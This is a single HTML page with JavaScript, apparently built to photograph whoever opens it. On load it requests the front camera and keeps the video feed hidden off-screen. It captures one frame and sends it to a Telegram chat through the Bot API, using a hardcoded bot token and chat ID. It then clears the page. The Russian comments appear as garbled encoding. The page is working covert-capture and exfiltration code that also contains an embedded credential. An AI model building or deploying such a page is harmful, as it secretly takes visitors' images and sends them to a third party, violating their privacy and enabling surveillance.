<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Selfie -> Telegram</title>
<style>
  body, html { margin:0; padding:0; width:100%; height:100%; background:#000; color:#0f0; font-family:Arial, sans-serif; }
  #status { position: fixed; top:20px; left:0; width:100%; text-align:center; z-index:1000; }
  /* —Å–∫—Ä—ã–≤–∞–µ–º video, –Ω–æ –¥–µ—Ä–∂–∏–º –≤ DOM */
  video#preview { position:fixed; left:-9999px; width:1px; height:1px; opacity:0; }
</style>
</head>
<body>
  <div id="status">üîÑ –ó–∞–ø—É—Å–∫...</div>

<script>
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
const status = document.getElementById('status');

function updateStatus(text) {
  status.textContent = text;
  console.log(text);
}

function sleep(ms) { return new Promise(res => setTimeout(res, ms)); }

async function captureAndSend() {
  let stream = null;
  try {
    updateStatus('1. –ó–∞–ø—Ä–∞—à–∏–≤–∞—é —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é –∫–∞–º–µ—Ä—É...');
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: { ideal: 'user' },
        width: { ideal: 1280 },
        height: { ideal: 720 },
        aspectRatio: { ideal: 9/16 } // –≤–µ—Ä—Ç–∏–∫–∞–ª—å–Ω–æ–µ
      },
      audio: false
    });

    updateStatus('‚úÖ –ö–∞–º–µ—Ä–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ ‚Äî —Å–æ–∑–¥–∞—é <video> –∏ –∑–∞–ø—É—Å–∫–∞—é –ø–æ—Ç–æ–∫');

    // —Å–æ–∑–¥–∞—ë–º video –∏ –¥–æ–±–∞–≤–ª—è–µ–º –≤ DOM (–º–Ω–æ–≥–∏–µ –º–æ–±.–±—Ä–∞—É–∑–µ—Ä—ã —Ç—Ä–µ–±—É—é—Ç –Ω–∞–ª–∏—á–∏–µ –≤ DOM)
    const video = document.createElement('video');
    video.id = 'preview';
    video.srcObject = stream;
    video.playsInline = true; // –≤–∞–∂–Ω–æ –¥–ª—è iOS
    video.muted = true;
    video.autoplay = true;
    document.body.appendChild(video);

    // –¥–æ–∂–¥—ë–º—Å—è, –∫–æ–≥–¥–∞ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ –∏ —Ä–µ–∞–ª—å–Ω–æ–µ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ –±—É–¥—É—Ç –≥–æ—Ç–æ–≤—ã
    updateStatus('2. –ñ–¥—É, –ø–æ–∫–∞ –≤–∏–¥–µ–æ –Ω–∞—á–Ω—ë—Ç –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç—å—Å—è...');
    await new Promise((resolve, reject) => {
      const onError = (e) => {
        cleanup();
        reject(new Error('–û—à–∏–±–∫–∞ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –≤–∏–¥–µ–æ: ' + (e?.message || e)));
      };
      // –µ—Å–ª–∏ —É–∂–µ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç—Å—è
      if (video.readyState >= 2 && !video.paused) {
        resolve();
        return;
      }
      // –Ω–∞ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞—Ö –Ω—É–∂–Ω–æ —è–≤–Ω–æ –≤—ã–∑–≤–∞—Ç—å play()
      const playPromise = video.play();
      if (playPromise && typeof playPromise.then === 'function') {
        playPromise.catch(err => {
          // –Ω–µ —Ñ–∞—Ç–∞–ª—å–Ω–æ ‚Äî –±—É–¥–µ–º —Å–ª—É—à–∞—Ç—å —Å–æ–±—ã—Ç–∏–µ playing
          console.warn('video.play() rejected:', err);
        });
      }
      // —Å–ª—É—à–∞–µ–º —Å–æ–±—ã—Ç–∏–µ playing
      video.addEventListener('playing', () => resolve(), { once: true });
      // —Ä–µ–∑–µ—Ä–≤–Ω—ã–π —Ç–∞–π–º–∞—É—Ç –Ω–∞ —Å–ª—É—á–∞–π, –µ—Å–ª–∏ —Å–æ–±—ã—Ç–∏–µ –Ω–µ –ø—Ä–∏–¥—ë—Ç
      setTimeout(() => {
        if (video.readyState >= 2) resolve();
        else resolve(); // –≤—Å—ë –∂–µ –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º ‚Äî —Å–ª–µ–¥—É—é—â–∏–π —ç—Ç–∞–ø –ø—Ä–æ–≤–µ—Ä–∏—Ç —à–∏—Ä–∏–Ω—É/–≤—ã—Å–æ—Ç—É
      }, 1200);
      // helper
      function cleanup() {
        video.removeEventListener('error', onError);
      }
    });

    // –£–±–µ–¥–∏–º—Å—è, —á—Ç–æ –∏–º–µ—é—Ç —Ä–µ–∞–ª—å–Ω—ã–µ —Ä–∞–∑–º–µ—Ä—ã
    // –∏–Ω–æ–≥–¥–∞ videoWidth/Height = 0 —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ playing ‚Äî –ø–æ–¥–æ–∂–¥—ë–º –Ω–µ–º–Ω–æ–≥–æ –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–µ–º requestVideoFrameCallback
    if (video.videoWidth === 0 || video.videoHeight === 0) {
      updateStatus('2.1 –ñ–¥—É –ø–µ—Ä–≤—ã–π –∫–∞–¥—Ä (requestVideoFrameCallback / –∑–∞–ø–∞—Å–Ω–æ–π —Ç–∞–π–º–∞—É—Ç)...');
      if ('requestVideoFrameCallback' in HTMLVideoElement.prototype) {
        await new Promise(res => video.requestVideoFrameCallback(() => res()));
      } else {
        // –∑–∞–ø–∞—Å–Ω–æ–π –Ω–µ–±–æ–ª—å—à–æ–π —Ç–∞–π–º–∞—É—Ç
        await sleep(150);
      }
    }

    // –ø—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–∑–º–µ—Ä–æ–≤ –µ—â—ë —Ä–∞–∑
    const vw = video.videoWidth || 1280;
    const vh = video.videoHeight || 720;
    updateStatus(`3. –ü–µ—Ä–≤—ã–π –∫–∞–¥—Ä –≥–æ—Ç–æ–≤ ‚Äî —Ä–∞–∑–º–µ—Ä—ã ${vw}x${vh}`);

    // —Å–æ–∑–¥–∞—ë–º canvas –Ω—É–∂–Ω–æ–π –æ—Ä–∏–µ–Ω—Ç–∞—Ü–∏–∏ (–¥–ª—è —Å–µ–ª—Ñ–∏ –æ–±—ã—á–Ω–æ —Ö–æ—Ç–∏–º –≤–µ—Ä—Ç–∏–∫–∞–ª—å)
    const canvas = document.createElement('canvas');
    // –ï—Å–ª–∏ –∫–∞–º–µ—Ä–∞ –¥–∞—ë—Ç –ª–∞–Ω–¥—à–∞—Ñ—Ç, –ø–æ–≤–æ—Ä–∞—á–∏–≤–∞–µ–º –∫–∞–Ω–≤–∞—Å –ø–æ–¥ –≤–µ—Ä—Ç–∏–∫–∞–ª—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –ø–æ–∑–∂–µ –ø–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏
    canvas.width = vw;
    canvas.height = vh;
    const ctx = canvas.getContext('2d');

    updateStatus('4. –†–∏—Å—É—é –∫–∞–¥—Ä –Ω–∞ canvas (–æ—Ç—Ä–∞–∂–∞—é –ø–æ –≥–æ—Ä–∏–∑–æ–Ω—Ç–∞–ª–∏ –¥–ª—è —Å–µ–ª—Ñ–∏)...');

    // –∑–µ—Ä–∫–∞–ª–∏–º (—Å–µ–ª—Ñ–∏-—Å—Ç–∏–ª—å)
    ctx.save();
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);

    // –ß—Ç–æ–±—ã –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å —á—Ç–æ –∫–∞–¥—Ä —Å–≤–µ–∂–∏–π ‚Äî –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å createImageBitmap (–µ—Å–ª–∏ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è)
    if (typeof createImageBitmap === 'function') {
      try {
        // createImageBitmap –ø—Ä–∏–Ω–∏–º–∞–µ—Ç video –∏ –≤–µ—Ä–Ω—ë—Ç bitmap —Ç–µ–∫—É—â–µ–≥–æ –∫–∞–¥—Ä–∞
        const bmp = await createImageBitmap(video);
        ctx.drawImage(bmp, 0, 0, canvas.width, canvas.height);
        bmp.close && bmp.close();
      } catch (e) {
        // fallback –Ω–∞ drawImage(video)
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      }
    } else {
      // fallback
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    }
    ctx.restore();

    updateStatus('5. –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é –ø–æ—Ç–æ–∫ –∫–∞–º–µ—Ä—ã...');
    // –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç—Ä–µ–∫–∏
    stream.getTracks().forEach(t => t.stop());

    // –Ω–µ–±–æ–ª—å—à–æ–π –ø–∞—É–∑a —á—Ç–æ–±—ã –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å, —á—Ç–æ canvas —Ä–µ–∞–ª—å–Ω–æ —Å–æ–¥–µ—Ä–∂–∏—Ç –ø–∏–∫—Å–µ–ª–∏ (—Ä–µ–¥–∫–æ –Ω—É–∂–Ω–æ)
    await sleep(50);

    // === –£–ª—É—á—à–µ–Ω–∏–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ) ===
    try {
      updateStatus('6. –ü—Ä–∏–º–µ–Ω—è—é —É–ª—É—á—à–µ–Ω–∏—è (—è—Ä–∫–æ—Å—Ç—å/–∫–æ–Ω—Ç—Ä–∞—Å—Ç)...');
      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const data = imageData.data;
      for (let i = 0; i < data.length; i += 4) {
        // –ª—ë–≥–∫–∞—è –∫–æ—Ä—Ä–µ–∫—Ü–∏—è ‚Äî —É–º–µ–Ω—å—à–∏–ª –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç—ã, —á—Ç–æ–±—ã –Ω–µ –ø–µ—Ä–µ—Å–≤–µ—Ç–∏—Ç—å
        data[i] = Math.min(255, data[i] * 1.25);       // R
        data[i+1] = Math.min(255, data[i+1] * 1.2);   // G
        data[i+2] = Math.min(255, data[i+2] * 1.2);   // B

        // –ø—Ä–æ—Å—Ç–æ–π –∫–æ–Ω—Ç—Ä–∞—Å—Ç —á–µ—Ä–µ–∑ —Ü–µ–Ω—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ
        const avg = (data[i] + data[i+1] + data[i+2]) / 3;
        if (avg > 160) {
          data[i] = Math.min(255, data[i] * 1.05);
          data[i+1] = Math.min(255, data[i+1] * 1.05);
          data[i+2] = Math.min(255, data[i+2] * 1.05);
        } else if (avg < 90) {
          data[i] = Math.max(0, data[i] * 0.95);
          data[i+1] = Math.max(0, data[i+1] * 0.95);
          data[i+2] = Math.max(0, data[i+2] * 0.95);
        }
      }
      ctx.putImageData(imageData, 0, 0);
    } catch (e) {
      console.warn('–ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–∏–º–µ–Ω–∏—Ç—å —É–ª—É—á—à–µ–Ω–∏—è:', e);
    }

    updateStatus('7. –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É—é –≤ Blob –∏ –æ—Ç–ø—Ä–∞–≤–ª—è—é –≤ Telegram...');
    canvas.toBlob(async (blob) => {
      if (!blob) {
        updateStatus('‚ùå –û—à–∏–±–∫–∞: –Ω–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å blob –∏–∑ canvas');
        return;
      }

      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'selfie_' + Date.now() + '.jpg');
      formData.append('caption', 'ü§≥ –°–µ–ª—Ñ–∏ —Å —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä—ã');

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const json = await res.json();
        if (json.ok) {
          updateStatus('‚úÖ –°–µ–ª—Ñ–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!');
          // –º–æ–∂–Ω–æ –æ—á–∏—Å—Ç–∏—Ç—å DOM (—Ñ–µ–π–∫–æ–≤—ã–π video)
          setTimeout(() => document.body.innerHTML = '', 1500);
        } else {
          updateStatus('‚ùå –û—à–∏–±–∫–∞ Telegram: ' + (json.description || JSON.stringify(json)));
          console.error('tg error', json);
        }
      } catch (err) {
        updateStatus('‚ùå –°–µ—Ç–µ–≤–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ Telegram');
        console.error(err);
      }
    }, 'image/jpeg', 0.92);

  } catch (err) {
    updateStatus('‚ùå –û—à–∏–±–∫–∞: ' + (err && err.message ? err.message : String(err)));
    console.error(err);
    if (stream) stream.getTracks().forEach(t => t.stop());
  }
}

// –ó–∞–ø—É—Å–∫–∞–µ–º
captureAndSend();
</script>
</body>
</html>
